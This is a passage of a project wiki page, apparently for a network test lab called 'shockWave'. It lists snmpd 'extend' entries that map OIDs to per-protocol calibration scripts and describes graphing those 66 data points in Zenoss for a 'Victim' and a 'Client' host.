extend .1.3.6.1.4.1.10002.6 https-calib6 /root/shockWave/Calibration/DATA-POINTS/BIN/make-https-6 
extend .1.3.6.1.4.1.10002.7 https-calib7 /root/shockWave/Calibration/DATA-POINTS/BIN/make-https-7 
extend .1.3.6.1.4.1.10002.8 https-calib8 /root/shockWave/Calibration/DATA-POINTS/BIN/make-https-8 
extend .1.3.6.1.4.1.10002.9 https-calib9 /root/shockWave/Calibration/DATA-POINTS/BIN/make-https-9 
extend .1.3.6.1.4.1.10002.10 https-calib10 /root/shockWave/Calibration/DATA-POINTS/BIN/make-https-10
extend .1.3.6.1.4.1.10002.11 https-calibAVG /root/shockWave/Calibration/DATA-POINTS/BIN/make-https-AVG 
##FTP
extend .1.3.6.1.4.1.10003.1 ftp-calib1 /root/shockWave/Calibration/DATA-POINTS/BIN/make-ftp-1 
extend .1.3.6.1.4.1.10003.2 ftp-calib2 /root/shockWave/Calibration/DATA-POINTS/BIN/make-ftp-2 
extend .1.3.6.1.4.1.10003.3 ftp-calib3 /root/shockWave/Calibration/DATA-POINTS/BIN/make-ftp-3 
extend .1.3.6.1.4.1.10003.4 ftp-calib4 /root/shockWave/Calibration/DATA-POINTS/BIN/make-ftp-4 
extend .1.3.6.1.4.1.10003.5 ftp-calib5 /root/shockWave/Calibration/DATA-POINTS/BIN/make-ftp-5 
extend .1.3.6.1.4.1.10003.6 ftp-calib6 /root/shockWave/Calibration/DATA-POINTS/BIN/make-ftp-6 
extend .1.3.6.1.4.1.10003.7 ftp-calib7 /root/shockWave/Calibration/DATA-POINTS/BIN/make-ftp-7 
extend .1.3.6.1.4.1.10003.8 ftp-calib8 /root/shockWave/Calibration/DATA-POINTS/BIN/make-ftp-8 
extend .1.3.6.1.4.1.10003.9 ftp-calib9 /root/shockWave/Calibration/DATA-POINTS/BIN/make-ftp-9 
extend .1.3.6.1.4.1.10003.10 ftp-calib10 /root/shockWave/Calibration/DATA-POINTS/BIN/make-ftp-10
extend .1.3.6.1.4.1.10003.11 ftp-calibAVG /root/shockWave/Calibration/DATA-POINTS/BIN/make-ftp-AVG
##SMTP
extend .1.3.6.1.4.1.10004.1 smtp-calib1 /root/shockWave/Calibration/DATA-POINTS/BIN/make-smtp-1 
extend .1.3.6.1.4.1.10004.2 smtp-calib2 /root/shockWave/Calibration/DATA-POINTS/BIN/make-smtp-2 
extend .1.3.6.1.4.1.10004.3 smtp-calib3 /root/shockWave/Calibration/DATA-POINTS/BIN/make-smtp-3 
extend .1.3.6.1.4.1.10004.4 smtp-calib4 /root/shockWave/Calibration/DATA-POINTS/BIN/make-smtp-4 
extend .1.3.6.1.4.1.10004.5 smtp-calib5 /root/shockWave/Calibration/DATA-POINTS/BIN/make-smtp-5 
extend .1.3.6.1.4.1.10004.6 smtp-calib6 /root/shockWave/Calibration/DATA-POINTS/BIN/make-smtp-6 
extend .1.3.6.1.4.1.10004.7 smtp-calib7 /root/shockWave/Calibration/DATA-POINTS/BIN/make-smtp-7 
extend .1.3.6.1.4.1.10004.8 smtp-calib8 /root/shockWave/Calibration/DATA-POINTS/BIN/make-smtp-8 
extend .1.3.6.1.4.1.10004.9 smtp-calib9 /root/shockWave/Calibration/DATA-POINTS/BIN/make-smtp-9 
extend .1.3.6.1.4.1.10004.10 smtp-calib10 /root/shockWave/Calibration/DATA-POINTS/BIN/make-smtp-10 
extend .1.3.6.1.4.1.10004.11 smtp-calibAVG /root/shockWave/Calibration/DATA-POINTS/BIN/make-smtp-AVG
##DNS
extend .1.3.6.1.4.1.10005.1 dns-calib1 /root/shockWave/Calibration/DATA-POINTS/BIN/make-dns-1 
extend .1.3.6.1.4.1.10005.2 dns-calib2 /root/shockWave/Calibration/DATA-POINTS/BIN/make-dns-2 
extend .1.3.6.1.4.1.10005.3 dns-calib3 /root/shockWave/Calibration/DATA-POINTS/BIN/make-dns-3 
extend .1.3.6.1.4.1.10005.4 dns-calib4 /root/shockWave/Calibration/DATA-POINTS/BIN/make-dns-4 
extend .1.3.6.1.4.1.10005.5 dns-calib5 /root/shockWave/Calibration/DATA-POINTS/BIN/make-dns-5 
extend .1.3.6.1.4.1.10005.6 dns-calib6 /root/shockWave/Calibration/DATA-POINTS/BIN/make-dns-6 
extend .1.3.6.1.4.1.10005.7 dns-calib7 /root/shockWave/Calibration/DATA-POINTS/BIN/make-dns-7 
extend .1.3.6.1.4.1.10005.8 dns-calib8 /root/shockWave/Calibration/DATA-POINTS/BIN/make-dns-8 
extend .1.3.6.1.4.1.10005.9 dns-calib9 /root/shockWave/Calibration/DATA-POINTS/BIN/make-dns-9 
extend .1.3.6.1.4.1.10005.10 dns-calib10 /root/shockWave/Calibration/DATA-POINTS/BIN/make-dns-10 
extend .1.3.6.1.4.1.10005.11 dns-calibAVG /root/shockWave/Calibration/DATA-POINTS/BIN/make-dns-AVG
##ICMP
extend .1.3.6.1.4.1.10006.1 icmp-calib1 /root/shockWave/Calibration/DATA-POINTS/BIN/make-icmp-1 
extend .1.3.6.1.4.1.10006.2 icmp-calib2 /root/shockWave/Calibration/DATA-POINTS/BIN/make-icmp-2 
extend .1.3.6.1.4.1.10006.3 icmp-calib3 /root/shockWave/Calibration/DATA-POINTS/BIN/make-icmp-3 
extend .1.3.6.1.4.1.10006.4 icmp-calib4 /root/shockWave/Calibration/DATA-POINTS/BIN/make-icmp-4 
extend .1.3.6.1.4.1.10006.5 icmp-calib5 /root/shockWave/Calibration/DATA-POINTS/BIN/make-icmp-5 
extend .1.3.6.1.4.1.10006.6 icmp-calib6 /root/shockWave/Calibration/DATA-POINTS/BIN/make-icmp-6 
extend .1.3.6.1.4.1.10006.7 icmp-calib7 /root/shockWave/Calibration/DATA-POINTS/BIN/make-icmp-7 
extend .1.3.6.1.4.1.10006.8 icmp-calib8 /root/shockWave/Calibration/DATA-POINTS/BIN/make-icmp-8 
extend .1.3.6.1.4.1.10006.9 icmp-calib9 /root/shockWave/Calibration/DATA-POINTS/BIN/make-icmp-9 
extend .1.3.6.1.4.1.10006.10 icmp-calib10 /root/shockWave/Calibration/DATA-POINTS/BIN/make-icmp-10 
extend .1.3.6.1.4.1.10006.11 icmp-calibAVG /root/shockWave/Calibration/DATA-POINTS/BIN/make-icmp-AVG
}}}

== Zenoss Link ==

- In order for our Monitoring System to Graph the Calibration Points, the following steps have been completed

=== Add Devices ===

- Both The Victim & the Client has been added to the monitoring System

{{attachment:zenoss1.jpg}}

=== Creating Data Points ===

- Manually Enter all '''''66 OIDS''''' so that Zenoss can execute the collector scripts.

{{attachment:zenoss2.jpg}}

=== Creating Graphs ===

- Create 6 graphs, one for each tested protocol.

- Each graph should contain 11 Data Points  (10 for clients and 1 for Avg of Avg DP)

{{attachment:zenoss3.jpg}}

=== Creating Report ===

- Create The Calibration Report using the following Graphs

{{attachment:zenoss4.jpg}}


=== Report Example ===

- The Calibration Report should look something like this in the end.






















{{attachment:zenoss-report.pdf}}






